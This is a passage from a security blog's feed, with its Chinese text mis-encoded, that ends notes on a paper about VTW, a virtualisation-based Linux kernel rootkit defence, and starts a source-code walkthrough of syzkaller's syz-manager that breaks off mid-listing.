å¼•å…¥çš„å¼€é”€åŒ…æ‹¬å­˜å‚¨ä¸è®¡ç®—å¼€é”€ã€‚</p><p>å­˜å‚¨å¼€é”€ä¸»è¦æŒ‡å†…å­˜å¼€é”€ï¼ŒåŒ…æ‹¬å†…å­˜ç©ºé—´å¼€é”€ä¸å¯»å€æ—¶é—´å¼€é”€ã€‚ VTW å ç”¨ä¸å¤šäº 200KB çš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨å…¶æ ¸å¿ƒä»£ç ä¸æ•°æ®ï¼Œä»¥åŠ 64KB ä»¥å­˜å‚¨è¢«ä¿æŠ¤çš„å†…æ ¸æ•°æ®ã€‚</p><p>è®¡ç®—å¼€é”€æ¥è‡ªç”± VTW å¸¦æ¥çš„äº‹ä»¶æ³¨å…¥ã€å†…æ ¸ä¿æŠ¤ä¸å¼‚å¸¸å¤„ç†ï¼Œè¿™äº›æ“ä½œå°†é€ æˆæ“ä½œç³»ç»Ÿä» guest æ¨¡å¼é™·å…¥ â€œhostâ€ æ¨¡å¼ã€‚</p><p>åœ¨ host æ¨¡å¼ä¸­ï¼ŒVTW å°†æ¥ç®¡æ§åˆ¶æµå¹¶è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚åœ¨å¼‚å¸¸å¤„ç†å®Œæˆä¹‹åï¼ŒVTW å°†æ“ä½œç³»ç»Ÿåˆ‡æ¢å› â€œguestâ€ æ¨¡å¼ï¼Œå¹¶å°†æ§åˆ¶æµè¿”è¿˜ç»™æ“ä½œç³»ç»Ÿè¿›è¡Œåç»­æ‰§è¡Œã€‚</p><p>åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ â€œguestâ€ æ¨¡å¼çš„æ‰§è¡Œå§‹ç»ˆæ˜¯è¢«é˜»å¡çš„ï¼Œå› æ­¤å¦‚æ‰§è¡Œé€Ÿåº¦ã€å»¶è¿Ÿã€ç½‘ç»œå»¶è¿Ÿã€I&#x2F;O ååè¿™æ ·çš„è¡¨ç°æŒ‡ç¤ºå™¨å°†ä¼šå—åˆ°å½±å“ã€‚æ­¤å¤–ï¼Œæ¨¡å¼åˆ‡æ¢é€ æˆå¯¹ TLB ä¸ç¼“å­˜çš„åˆ·æ–°ï¼Œè¿™å°†å¢åŠ å¯¹æ“ä½œç³»ç»Ÿçš„æ€§èƒ½å½±å“ã€‚</p><p>å½“ VTW æ­£åœ¨è¿è¡Œï¼Œå¯¼è‡´æ“ä½œç³»ç»Ÿè¿›è¡Œæ¨¡å¼åˆ‡æ¢çš„å› ç´ åŒ…æ‹¬æŒ‡ä»¤é™·å…¥ä¸äº‹ä»¶é™·å…¥ï¼Œå‰è€…ç”±å¯¹ç‰¹å®šæŒ‡ä»¤çš„æ‰§è¡Œè§¦å‘ï¼Œåè€…ç”±ç‰¹å®šäº‹ä»¶è§¦å‘ã€‚åœ¨ guest æ¨¡å¼ä¸­ï¼Œå¯¹æŒ‡ä»¤ CPUIDã€GETTSECã€INVDã€XSETBV ä¸é™¤äº† VMFUNC ä»¥å¤–çš„æ‰€æœ‰ VMX æŒ‡ä»¤éƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿæ— æ¡ä»¶åœ°é™·å…¥åˆ° â€œhostâ€ã€‚</p><p>è§¦å‘æ“ä½œç³»ç»Ÿæ¨¡å¼åˆ‡æ¢çš„äº‹ä»¶åŒ…æ‹¬æ¨¡å—åŠ è½½ã€æ¨¡å—å¸è½½ã€åœ¨æ¨¡å—åŠ è½½æ—¶çš„çŠ¶æ€åˆ‡æ¢ã€æ¨¡å—é—´çš„è·³è½¬ä¸æ§åˆ¶æµè¿”å›ã€æ¨¡å—è°ƒåº¦æ‰§è¡Œã€â€œhostâ€ ç§æœ‰é¡µè¡¨çš„æ›´æ–°ã€ç¯¡æ”¹é™æ€å†…æ ¸æ•°æ®ã€å•æ­¥è°ƒè¯•æ¨¡å¼ã€åŠ¨ä½œå›æ”¾ã€‚</p><p>$Impact on the Execution Speed of LKM$ã€‚ä¸ºäº†æµ‹é‡ VTW åœ¨ LKM æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“ï¼Œæˆ‘ä»¬å¼•å…¥äº†ä¸¤ä¸ªæµ‹è¯•æ¨¡å— $LKM_1$ ä¸ $LKM_2$ ï¼Œä»–ä»¬åˆ†åˆ«å±äº CPU å¯†é›†å‹ä¸ I&#x2F;O å¯†é›†å‹çš„æ¨¡å—ï¼Œå‰è€…ç”¨ä»¥è®¡ç®— $\pi$ çš„å€¼ï¼Œåè€…ç”¨ä»¥è¯»å†™æ–‡ä»¶ã€‚</p><p>æµ‹è¯•ç»“æœå¦‚ å›¾.11 æ‰€ç¤ºã€‚æ¨ªåæ ‡ä¸ºå®çº¿æŒ‡ç¤ºäº† $\pi$ å°æ•°ç‚¹åçš„ä½æ•°ï¼Œä¸æ–‡ä»¶æ“ä½œæ•°é‡ç›¸å…³çš„ä¸ºç‚¹çº¿ã€‚çºµåæ ‡æŒ‡ç¤ºäº†é€Ÿåº¦æŸå¤±é€Ÿç‡ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/LwJ8WEfkNdTosPb.png" alt="å›¾.11 LKM é€Ÿåº¦æŸå¤±ç³»æ•°ä¸ Î  çš„å°æ•°ä½æ•°ç»˜åˆ¶ä¸ºå®çº¿ï¼ŒI/O æ“ä½œçš„æ•°é‡ç»˜åˆ¶ä¸ºç‚¹çº¿"></p><p>ä¸æ­¤ç›¸åï¼Œå½“æ¨¡å—è¿è¡Œè¾ƒé•¿ä¸€æ®µæ—¶é—´æ—¶ï¼Œç”± VTW é€ æˆçš„æ€§èƒ½æŸå¤±æ¯”ä¾‹æ›´å°ã€‚å¯¹äºæ™®é€š LKMs è€Œè¨€ï¼ŒVTW ä»…åœ¨ä»–ä»¬è¢«åŠ è½½ä»¥åŠçŠ¶æ€è¢«æ›´æ–°æ—¶å¹²æ¶‰ä»–ä»¬çš„æ‰§è¡Œã€‚ç”± VTW é€ æˆçš„ â€œguestâ€ çš„é˜»å¡æ—¶é—´æ˜¯æ¯”è¾ƒå›ºå®šçš„ã€‚å½“ LKM çš„æ‰§è¡Œæ—¶é—´è¾ƒçŸ­æ—¶ï¼ŒVTW ä¼šé˜»å¡ â€œguestâ€ æ¨¡å¼æ›´å¤šæ¯”ä¾‹çš„æ—¶é—´ï¼Œç”±æ­¤æ€§èƒ½æŸå¤±ç³»æ•°ä¼šå˜å¾—æ›´å¤§ã€‚</p><p>é™·é˜±çš„æ•°é‡ä¸åœ¨æ¨¡å—é—´çš„æ§åˆ¶æµè·³è½¬çš„æ•°é‡ä¸ºå½±å“ LKM æ‰§è¡Œé€Ÿåº¦çš„å…³é”®å› ç´ ã€‚æˆ‘ä»¬ä»¥ä¸€ä¸ªè¿è¡Œæ—¶é—´å¤§çº¦ 7.6s çš„ $LKM_3$ ä½œä¸ºæµ‹è¯•å¯¹è±¡ï¼Œå¹¶æµ‹é‡äº†é™·é˜±æ•°é‡åœ¨å…¶æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“ã€‚</p><p>æˆ‘ä»¬é‡å†™äº† $LKM_1$ ä¸ $LKM_2$ ä½¿å¾—æ§åˆ¶æµåœ¨å…¶é—´è·³è½¬ï¼Œ ä»–ä»¬å¯ä»¥è¢«ç”¨ä»¥æµ‹é‡è·³è½¬æ¬¡æ•°å¯¹ LKM æ‰§è¡Œé€Ÿåº¦çš„å½±å“ã€‚å®éªŒç»“æœå¦‚ å›¾.12 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/11/p4HBzul5Tcj9iRm.png" alt="å›¾.12 ç³»ç»Ÿé™·é˜±ä¸æ§åˆ¶æµè·³è½¬åœ¨ LKM æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“"></p><p>ç‚¹çº¿æ˜¾ç¤ºäº†å½“é™·é˜±æ•°é‡è¾ƒå°‘æ—¶ VTW åœ¨ LKM çš„æ‰§è¡Œé€Ÿåº¦ä¸Šçš„å½±å“æ˜¯è¾ƒå°çš„ã€‚å½“é™·é˜±æ•°é‡è¶…è¿‡ 1000000 æ—¶ï¼ŒLKM çš„æ‰§è¡Œå°†ä¼šå‡é€Ÿåˆ° 80%ã€‚å®çº¿æ˜¾ç¤ºäº†å½“è·³è½¬æ•°é‡è¶…è¿‡ 100 æ—¶ï¼ŒVTW å‡é€Ÿåˆ°äº† 8%ã€‚å½“è·³è½¬æ•°é‡è¶…è¿‡ 1000 æ—¶ï¼Œ LKM çš„æ‰§è¡Œé€Ÿåº¦å°†ä¼šæ€¥å‰§å‡å°ã€‚</p><p>æ§åˆ¶æµè·³è½¬å¯¹ LKM æ‰§è¡Œçš„å½±å“æ¯”é™·é˜±æ›´å¤§ã€‚ä¸€ä¸ªå®Œæ•´çš„è·³è½¬ä¸è¿”å›æ¶‰åŠåˆ°ä¸¤ä¸ªæ¨¡å¼åˆ‡æ¢ä¸å››ä¸ªä»£ç æ‰§è¡Œæƒé™ï¼Œå› æ­¤ VTW åœ¨å¤„ç†æ¨¡å—é—´è·³è½¬æ—¶ä¼šé‡åˆ°æ›´å¤šçš„å¼€é”€ï¼Œ</p><h2 id="7-4-Comparison-With-Other-Defence-Schemes"><a href="#7-4-Comparison-With-Other-Defence-Schemes" class="headerlink" title="7.4 Comparison With Other Defence Schemes"></a>7.4 Comparison With Other Defence Schemes</h2><p>åœ¨ è¡¨.6 ä¸­ï¼Œæˆ‘ä»¬å°† VTW çš„è¡¨ç°ä¸ä¸ƒä¸ªå·²çŸ¥ rootkit é˜²å¾¡æ–¹æ¡ˆå¯¹æ¯”ã€‚å¤§éƒ¨åˆ†å…¶ä»–çš„ rootkit é˜²æŠ¤æ–¹æ¡ˆåº”ç”¨äº†è™šæ‹Ÿæœºçš„å†…çœæŠ€æœ¯ï¼Œè¿™ä¸ VTW ä¸»è¦åŸºäºäº‹ä»¶è¿½è¸ªçš„æ–¹æ¡ˆæ˜¯éå¸¸ä¸åŒçš„ã€‚</p><p><img src="https://s2.loli.net/2023/04/11/1wYp3xarzkyiXSF.png" alt="è¡¨.6 VTW æ–¹æ¡ˆä¸å…¶ä»–é˜²æŠ¤æ–¹æ¡ˆå¯¹æ¯”"></p><p>æˆ‘ä»¬ä»å››ä¸ªè¡¨ç°é¢†åŸŸå¯¹ä»–ä»¬è¿›è¡Œå®šæ€§æ¯”è¾ƒï¼š$æ£€æµ‹ã€é˜²æŠ¤ã€å¯è¿½è¸ªæ€§ã€å¯ç§»æ¤æ€§$ã€‚VTW åœ¨è¿™å››ä¸ªé¢†åŸŸæœ‰ç€å¦‚å‰æ–‡æ‰€è¿°çš„æ˜¾è‘—çš„ä¼˜ç‚¹ã€‚åœ¨æœªæ¥çš„å·¥ä½œä¸­éœ€è¦æ›´å¤šçš„åŸºå‡†æµ‹è¯•å®éªŒä»¥æ­ç¤ºä¸€äº›å®šé‡çš„ç»“æœã€‚</p><p>æˆ‘ä»¬çš„ VTW ä»…è¢«è®¾è®¡ä»¥æ”¯æŒ Intel å¤„ç†å™¨åŠä»…ä¿æŠ¤åŸºäº Linux çš„ x86 æœåŠ¡å™¨ã€‚å½“å‰çš„ VTW ç‰ˆæœ¬å¹¶ä¸æ”¯æŒè¿è¡Œ Windows æˆ–å…¶ä»–æ“ä½œç³»ç»Ÿå¹³å°çš„æœåŠ¡å™¨ã€‚ç„¶è€Œï¼ŒVirtuoso æ–¹æ¡ˆå·²ç»æŠ¥å‘Šäº†å…¶åœ¨ä¸åŒå¹³å°ä¸Šçš„é«˜å¯ç§»æ¤æ€§ã€‚</p><p>æ ¹æ®è§£å†³æ¶æ„è½¯ä»¶å˜ç§çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å°†æ£€æµ‹ã€é˜²æŠ¤ã€å¯è¿½è¸ªæ€§èƒ½åŠ›åˆ†ä¸ºä¸‰ä¸ªçº§åˆ«ï¼šå¥½ã€ä¸€èˆ¬ã€å·®ã€‚</p><p>å¯¹äº rootkit æ£€æµ‹ï¼ŒVTWã€Xtierã€Virtuosoã€RTKDSM éƒ½è¢«è¯„ä¸ºå¥½ã€‚å¯¹äºé˜²æŠ¤ä¸å¯è¿½è¸ªæ€§ï¼Œæ‰€æœ‰çš„æ–¹æ¡ˆéƒ½è¢«è¯„ä¸ºä¸€èˆ¬æˆ–å·®ï¼Œä»…æœ‰ DIKernel å±•ç¤ºäº†ä¸€äº›é˜²æŠ¤èƒ½åŠ›ã€‚ä¸ VTW ç±»ä¼¼ï¼Œæ‰€æœ‰æŠ¥é“çš„æ–¹æ¡ˆéƒ½è¿è¡Œåœ¨ x86 å¤„ç†å™¨ï¼Œé™¤äº† DIKernel åœ¨ arm-v7ã€‚</p><p>æˆ‘ä»¬çš„å®éªŒæ­ç¤ºäº†ä¸€äº›åœ¨ CPU ä¸Šçš„æµ‹é‡ç»“æœä¸å­˜å‚¨å¼€é”€ã€‚å¦‚ä¸ è¡¨.6 ä¸­å‰©ä½™çš„æ–¹æ¡ˆå¯¹æ¯”æ‰€ç¤ºï¼ŒVTW åœ¨å®æ–½æ‰€æœ‰çš„é˜²æŠ¤ä¸è¿‡æ»¤æ“ä½œçš„ç³»ç»Ÿå¼€é”€ä¸Šå±•ç°äº†æ˜¾è‘—çš„ä¼˜åŠ¿ã€‚ç‰¹åˆ«çš„ï¼Œæˆ‘ä»¬æƒ³è¦æŒ‡å‡ºä½¿ç”¨ VMST ä¸ PTKDSM æ–¹æ¡ˆçš„è¿‡åº¦å¼€é”€ã€‚</p><h1 id="8-Concluding-Remarks"><a href="#8-Concluding-Remarks" class="headerlink" title="8 Concluding Remarks"></a>8 Concluding Remarks</h1><p>æœ¬è®ºæ–‡æå‡ºäº†ä¸€ç§æ–°çš„è™šæ‹ŸåŒ–å¢™ï¼ˆvirtual wallï¼ŒVTWï¼‰æ–¹æ¡ˆä»¥åœ¨ Linux æœåŠ¡å™¨ä¸Šè¿‡æ»¤å†…æ ¸ rootkitã€‚æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¯æ˜äº†æˆ‘ä»¬çš„ VTW é˜²æŠ¤æ–¹æ¡ˆåœ¨ rootkit çš„æ£€æµ‹ã€é˜²æŠ¤ã€å¯è¿½è¸ªæ€§ä¸Šæœ‰ç€è¾ƒå¥½çš„è¡¨ç°ã€‚VTW æ¯”å…¶ä»–ä»»ä½• rootkit é˜²æŠ¤ç³»ç»Ÿçš„å†…å­˜ä¸å­˜å‚¨å¼€é”€éƒ½è¦ä½å¾—å¤šã€‚</p><p>æ‰€æœ‰åœ¨ guest æ¨¡å¼ä¸‹æŸåå®‰å…¨ç­–ç•¥çš„æ“ä½œéƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿé™·å…¥åˆ° host æ¨¡å¼ä¸­ï¼ŒVTW åˆ©ç”¨ä¸€ç§å†…å­˜è®¿é—®æ§åˆ¶æœºåˆ¶ä¸ä¸€ä¸ªäº‹ä»¶æ³¨å…¥æœºåˆ¶æ¥å®Œæˆ rootkit è¿‡æ»¤è¿‡ç¨‹ã€‚</p><p>æœªæ¥è¿½è¸ª LKMs çš„æ‰§è¡Œè·¯å¾„ä¸æ‰€æœ‰çš„å†…æ ¸æ”»å‡»å‚ä¸è€…ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§åŸºäº LKM æ‰§è¡Œè·¯å¾„çš„è¿½è¸ªæœºåˆ¶ã€‚æˆ‘ä»¬çš„ VTW å®æ—¶ä¿æŠ¤äº†é™æ€å†…æ ¸æ•°æ®çš„å®Œæ•´æ€§ã€‚å¯¹äºåŠ¨æ€å†…æ ¸å¯¹è±¡ï¼ŒVTW åœ¨è¿½è¸ªè¿‡ç¨‹ä¸­æ£€æµ‹å†…æ ¸æ•°æ®çš„å¯ç”¨æ€§ï¼Œç”±æ­¤æ¯ä¸ªè¢«ç ´åçš„ LKM æ•°æ®éƒ½å¯ä»¥è¢«æ£€æµ‹ä¸æ¢å¤ã€‚</p><p>æˆ‘ä»¬çš„ VTW ä½¿ç”¨é€šç”¨é˜²æŠ¤å¼‚å¸¸æ¥é˜²æ­¢æ›´å¤šçš„æŸå®³ã€‚å½“å†…æ ¸æ”»å‡»çš„å‚ä¸è€…æ¶‰åŠå¤šä¸ªå†…æ ¸ rootkits æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥ LKM çš„æ‰§è¡Œè·¯å¾„è·å¾—ä¸æ”»å‡»ç›¸å…³çš„æ‰§è¡Œå®ä½“ã€‚æˆ‘ä»¬è¿½è¸ªåœ¨ä¸€æ¬¡æ”»å‡»ä¸­æ‰€æœ‰å‚ä¸çš„å†…æ ¸ rootkitsã€‚VTW ä¸ºæ€»çš„ CPU æ—¶é—´å¢åŠ äº†é¢å¤–çš„ 2% ã€‚</p><p>æ¶ˆæçš„ä¸€é¢æ˜¯ï¼ŒVTW è¢«é™åˆ¶äºä»…èƒ½ä¿æŠ¤ Linux æœåŠ¡å™¨ã€‚æˆ‘ä»¬çš„ VTW æ–¹æ¡ˆä»…æ”¯æŒ Intel å¤„ç†å™¨ä¸ Linux ç³»ç»Ÿã€‚VTW å¹¶ä¸èƒ½åœ¨ AMDã€ARM å¤„ç†å™¨æˆ–æ˜¯è¿è¡Œ Windows çš„æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚SYRINGEã€VMSTã€DIKernel é˜²æŠ¤æ–¹æ¡ˆäº¦æ˜¯å¦‚æ­¤ã€‚</p><p>VTW å¯¹ BIOS æˆ–ç”¨æˆ·çº§çš„ rootkit æ”»å‡»çš„é˜²æŠ¤æœ‰é™ã€‚å¯¹äºå¯èƒ½æŸå®³å†…æ ¸å®Œæ•´æ€§çš„ rootkitsï¼Œä»–ä»¬å¯èƒ½ä½¿ç”¨ $&#x2F;dev&#x2F;kmem$ æˆ– $&#x2F;dev&#x2F;mem$ æˆ–å…¶ä»–æ–¹æ¡ˆï¼Œè¿™å¯ä»¥ä»æœ¬è®ºæ–‡çš„ VTW ä¸­æ‰©å±•ã€‚ç”±äºé¡µæ•°é™åˆ¶ï¼Œæˆ‘ä»¬å°†åœ¨æœªæ¥çš„å·¥ä½œä¸­ä½¿ç”¨è¿™äº›æ‰©å±•ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»»ä½• rootkitï¼Œç»ˆå°†ç»³ä¹‹ä»¥æ³•ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ROOTKIT" scheme="https://arttnba3.github.io/tags/ROOTKIT/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ã€FUZZ.0x02ã€‘syzkaller - IIï¼šsyz-manageræºç åˆ†æ</title>
    <link href="https://arttnba3.github.io/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>https://arttnba3.github.io/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T17:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>å®å°±æ˜¯ğŸ‘´ã® Manager ğŸ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>syzkaller æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„ kernel fuzzerï¼Œè™½ç„¶ç¬”è€…ä¹‹å‰æ›¾ç»ç”¨è¿‡ï¼ˆä¸è¿‡ç¬”è€…å¤ªèœäº†å•¥éƒ½æ²¡æŒ–å‡ºæ¥ï¼‰ä¹Ÿæ›¾ç²—ç•¥è¯»è¿‡æºç ï¼Œä½†æ˜¯æ²¡æœ‰å¤ªè¿‡äºä»”ç»†åˆ†æå°±æŠ›åœ¨è„‘åäº†ï¼ˆæ‚²ï¼‰</p><p>ä¸ºäº†æ·±å…¥å­¦ä¹  fuzzing theoryï¼Œç¬”è€…å†³å®šå…ˆä»è¿™ä¸ªå…¸ä¸­å…¸çš„ syzkaller æºç è¿›è¡Œåˆ†æå­¦ä¹  ï¼šï¼‰</p><h2 id="PRE-å·¥ä½œåŸç†"><a href="#PRE-å·¥ä½œåŸç†" class="headerlink" title="PRE.å·¥ä½œåŸç†"></a>PRE.å·¥ä½œåŸç†</h2><p>å¯¹äº syzkaller çš„æ¶æ„ï¼Œå®˜æ–¹ç»™å‡ºäº†è¿™æ ·çš„ä¸€å¼  Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller æ•´ä½“ä¸Šä¸ºä¸€ä¸ª<strong>åŒæœºè°ƒè¯•ç»“æ„</strong>ï¼šç”±ä¸€å°æœºå™¨è´Ÿè´£ç®¡æ§æ•´ä¸ª fuzzing æµç¨‹ï¼ˆæœ¬æ–‡ç§°ä¸º <code>Host</code>ï¼‰ï¼Œåœ¨å¦ä¸€å°æœºå™¨ä¸Šè¿›è¡Œ fuzzingï¼ˆæœ¬æ–‡ç§°ä¸º <code>Guest</code>ï¼‰ï¼ŒGuest é€šå¸¸ä¸ºè™šæ‹Ÿæœºï¼Œä»è€Œèƒ½è®© Host æ›´å¥½åœ°ç®¡æ§æ•´ä¸ªæµç¨‹</p><p>syzkaller åˆ†ä¸ºä¸‰å¤§ç»„ä»¶ï¼š</p><ul><li><p>ä½äº Hostï¼š</p><ul><li><code>syz-manager</code> ï¼šsyzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹ï¼ˆå¦‚å›¾æ‰€ç¤ºçš„ä¸€ä¸ªé»„è‰²å¡ç‰‡å°±æ˜¯ä¸€ä¸ªå®ä¾‹ï¼‰å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code></li></ul></li><li><p>ä½äº Guestï¼š</p><ul><li><code>syz-fuzzer</code> ï¼šè´Ÿè´£å¼•å¯¼æ•´ä¸ª fuzz çš„è¿‡ç¨‹ï¼š<ul><li>ç”Ÿæˆ input</li><li>å¯åŠ¨ <code>syz-executor</code> è¿›ç¨‹è¿›è¡Œ fuzz</li><li>ä»è¢« fuzz çš„ kernel çš„ <code>/sys/kernel/debug/kcov</code> è·å¾—è¦†ç›–ï¼ˆcoverageï¼‰çš„ç›¸å…³ä¿¡æ¯</li><li>é€šè¿‡ RPC å°†æ–°çš„è¦†ç›–å›é€åˆ° <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>ï¼šè´Ÿè´£<strong>æ‰§è¡Œå•ä¸ªè¾“å…¥</strong>â€”â€”ä» <code>syz-fuzzer</code> å¤„æ¥å— input å¹¶æ‰§è¡Œï¼Œæœ€åå›é€ç»“æœ</li></ul></li></ul><p><code>syz-manager</code> ä¸º syzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code>ï¼Œæˆ‘ä»¬é€šå¸¸å¯åŠ¨ fuzzing æ—¶ä¾¿æ˜¯ä»¥ <code>syz-manager</code> ä½œä¸ºç¨‹åºå¯åŠ¨çš„å…¥å£ç‚¹ï¼Œå› æ­¤ç¬”è€…ä¹Ÿå…ˆä»æ­¤å¤„å¼€å§‹åˆ†æ</p><h1 id="0x01-åŸºæœ¬ç»“æ„ä½“"><a href="#0x01-åŸºæœ¬ç»“æ„ä½“" class="headerlink" title="0x01. åŸºæœ¬ç»“æ„ä½“"></a>0x01. åŸºæœ¬ç»“æ„ä½“</h1><p>ç›¸æ¯”äºç›´æ¥å¼€å§‹åˆ†ææºç ï¼Œç¬”è€…è®¤ä¸ºæœ‰å¿…è¦åœ¨æ­¤ä¹‹å‰å…ˆåˆ—å‡ºä¸€äº›åŸºæœ¬çš„ç»“æ„ä½“ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠè¿™ä¸€èŠ‚å½“æˆä¸€ä¸ªè¡¨æ¥æŸ¥ ï¼šï¼‰</p><h2 id="VM-ç®¡æ§ç›¸å…³"><a href="#VM-ç®¡æ§ç›¸å…³" class="headerlink" title="VM ç®¡æ§ç›¸å…³"></a>VM ç®¡æ§ç›¸å…³</h2><p>Host éœ€è¦å»æ„ŸçŸ¥ä¸ç®¡æ§ Guest VMsï¼Œå› è€Œåœ¨ <code>syz-manager</code> å½“ä¸­æœ‰ç€ä¸€å¥—ç›¸åº”çš„è¡¨ç¤ºä¸ç®¡ç† Guest VM çš„ç»“æ„ä½“</p><h3 id="1-Instanceï¼šVM-å®ä¾‹"><a href="#1-Instanceï¼šVM-å®ä¾‹" class="headerlink" title="1. Instanceï¼šVM å®ä¾‹"></a>1. Instanceï¼šVM å®ä¾‹</h3><p><code>syz-manager</code> ä¸­çš„ VM å®é™…ä¸Šæ˜¯ä½¿ç”¨ä¸€ä¸ªåä¸º <code>Instance</code> çš„ç»“æ„ä½“æ¥è¡¨ç¤ºçš„ï¼Œå®šä¹‰äº <code>vm/vm.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°ï¼Œå…¶éœ€è¦å®ç° <code>Interface</code> æ¥å£ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance è¡¨ç¤ºä¸€ä¸ªå•ç‹¬çš„ VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy å¤åˆ¶ä¸€ä¸ª hostSrc æ–‡ä»¶åˆ° VM ä¸­å¹¶è¿”å› VM ä¸­çš„æ–‡ä»¶å.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward è®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œ</span><br><span class="hljs-comment">// å¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run åœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤ (ç±»ä¼¼ ssh cmd).</span><br><span class="hljs-comment">// outc æ¥å—æ··åˆäº†å‘½ä»¤è¡Œä¸å†…æ ¸æ§åˆ¶å°çš„è¾“å‡º.</span><br><span class="hljs-comment">// errc æ¥å—å‘½ä»¤ç­‰å¾…è¿”å› error æˆ– vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command åœ¨ timeout ååœæ­¢. åœ¨ stop chan ä¸Šå‘é€å¯ä»¥ç”¨ä»¥æ›´æ—©å°†å…¶ç»ˆæ­¢.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose ä» VM ä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</span><br><span class="hljs-comment">// (ä¾‹å¦‚é€šè¿‡å‘é€ä¸€äº› sys-rq&#x27;s æˆ– 